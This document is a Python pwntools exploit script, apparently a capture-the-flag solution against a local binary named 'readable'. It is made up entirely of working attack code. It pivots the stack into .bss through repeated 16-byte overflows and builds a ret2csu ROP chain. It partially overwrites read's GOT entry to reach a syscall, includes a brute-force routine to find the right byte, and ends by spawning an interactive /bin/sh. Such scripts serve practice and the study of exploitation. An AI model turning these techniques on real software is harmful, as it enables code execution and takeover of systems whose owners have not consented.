from pwn import *
context.terminal = ["tmux", "splitw", "-h"]
context.log_level = 'error'
elf = ELF("./readable")
csu_first_addr = 0x40058A
csu_second_addr = 0x400570


def read16bytes(targetaddr, content):
    payload = 'a'*16
    payload += p64(targetaddr+0x10)
    payload += p64(0x400505)
    payload += content.ljust(16, "\x00")
    payload += p64(0x600f00)
    payload += p64(0x400505)
    return payload


def csu_gadget(rbx, rbp, r12, r13, r14, r15):
    # rdx = r13
    # rsi = r14
    # rdi = r15d
    # call [r12+rbx*8]
    # set rbx+1=rbp
    payload = flat([csu_first_addr, rbx, rbp, r12, r13,
                    r14, r15, csu_second_addr], arch="amd64")
    return payload


def bruteforce():
    rop_addr = elf.bss()
    for i in range(0, 256):
        io = process("./readable")
        # modify read's got
        payload = csu_gadget(0, 1, elf.got["read"], 1, elf.got["read"], 0)
        # jump to read again
        # try to write ELF Header to stdout
        payload += csu_gadget(0, 1, elf.got["read"], 4, 0x400000, 1)
        # gdb.attach(io)
        # pause()
        for j in range(0, len(payload), 16):
            tmp = read16bytes(rop_addr+j, payload[j:j+16])
            io.send(tmp)
        # jump to the rop
        payload = 'a'*16
        payload += p64(rop_addr-8)
        payload += p64(0x400520)  # leave ret

        io.send(payload)
        io.send(p8(i))
        try:
            data = io.recv(timeout=0.5)
            if data == "\x7FELF":
                print(hex(i), data)
        except Exception as e:
            pass
        io.close()


def exp():
    rop_addr = elf.bss()
    io = process("./readable")
    execve_number = 59
    bin_sh_addr = elf.got["read"]-execve_number+1
    # modify the last byte of read's got
    payload = csu_gadget(0, 1, elf.got["read"], execve_number, bin_sh_addr, 0)
    # jump to read again, execve("/bin/sh\x00")
    payload += csu_gadget(0, 1, elf.got["read"],
                          bin_sh_addr+8, bin_sh_addr+8, bin_sh_addr)
    for j in range(0, len(payload), 16):
        tmp = read16bytes(rop_addr+j, payload[j:j+16])
        io.send(tmp)
    # jump to the rop
    payload = 'a'*16
    payload += p64(rop_addr-8)
    payload += p64(0x400520)  # leave ret
    io.send(payload)

    payload = '/bin/sh'.ljust(execve_number-1, '\x00')+p8(0xc2)
    io.send(payload)
    io.interactive()


if __name__ == "__main__":
    # bruteforce()
    exp()
